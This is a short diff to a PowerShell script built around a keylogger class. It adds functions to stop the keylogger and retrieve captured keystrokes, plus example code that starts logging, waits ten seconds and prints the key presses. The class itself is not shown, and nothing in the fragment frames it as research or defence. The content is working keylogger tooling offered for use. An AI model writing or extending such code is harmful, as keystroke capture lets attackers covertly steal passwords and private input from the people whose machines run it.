@@ -11,10 +11,28 @@ function Start-KeyLogger {
     }
 
     Write-Output "Starting KeyLogger..."
-    [KeyLogger]::Start()
+    [KeyLogger]::Start() 
+}
+
+function Stop-KeyLogger {
+    Write-Output "Stopping KeyLogger..."
+    [KeyLogger]::Stop()
+}
+
+function Get-KeyPresses {
+    return [KeyLogger]::GetKeyPresses()
 }
 
 # Call the function to start the keylogger
 Start-KeyLogger
+
+# Example usage: Get the key presses after some time
+Write-Output "Keylogger started. Sleeping for 10 seconds..."
+Start-Sleep -Seconds 10
+$keyPresses = Get-KeyPresses
+Write-Output "Captured Key Presses: $($keyPresses -join ', ')"
+
+# Stop the keylogger
+Stop-KeyLogger
 
 # ...existing code...
